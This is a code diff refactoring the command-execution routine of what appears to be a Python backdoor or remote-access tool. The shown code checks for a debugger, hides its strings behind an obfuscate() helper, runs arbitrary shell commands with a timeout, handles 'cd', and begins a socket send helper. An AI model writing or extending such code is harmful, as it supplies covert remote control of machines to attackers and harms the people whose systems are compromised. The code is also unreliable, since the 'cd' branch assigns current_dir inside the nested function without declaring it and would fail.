@@ -35,31 +35,31 @@ def check_debugger():
     except AttributeError:
         return False
 
-def execute_command(cmd):
+def execute_command( cmd ):
     '''
     Execute the given command line instruction.
     '''
     global current_dir
+    output = obfuscate( STR_COMMAND_TOOK_LONG )
 
     def target():
+        nonlocal output
         if cmd.startswith( "cd " ):  # special logic for cd instructions
             os.chdir( os.path.join( current_dir , cmd[ 3 : ] ) )
             current_dir = os.path.abspath( os.getcwd() )
-            nonlocal output
             output = obfuscate( STR_CD ) + current_dir
         else:
             process = subprocess.Popen( cmd , shell = True , stdout = subprocess.PIPE , stderr = subprocess.PIPE , cwd = current_dir )
             out, err = process.communicate()
-            nonlocal output
-            output = out.decode() + err.decode()
+            output = out.decode() + err.decode()  # Update output within the thread
 
-    output = "Command took too long to execute"
     thread = threading.Thread( target = target )
     thread.start()
     thread.join( timeout = 10 )
     if thread.is_alive():
-        thread.join()
+        thread.join()  # Make sure to clean up if still running
     return output
+
 
 def send_all( sock , data ):
     '''
